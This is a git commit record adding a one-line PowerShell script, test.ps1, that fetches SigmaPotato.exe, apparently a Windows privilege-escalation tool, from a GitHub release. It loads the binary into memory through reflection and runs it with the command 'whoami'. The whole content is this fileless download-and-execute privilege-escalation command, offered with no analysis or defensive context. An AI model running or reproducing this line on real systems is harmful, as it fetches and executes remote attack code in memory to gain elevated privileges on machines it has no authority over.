be92e1edb97a181b3d3c29a227fab0ddb262492c
Ahmed Muhannad <ahmedmhj.nu@gmail.com>
2025-04-13 13:33:45 +0300

    Create test.ps1

---
+++ test.ps1
@@ -0,0 +1,1 @@
+[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData('https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe')); [SigmaPotato]::Main('whoami')
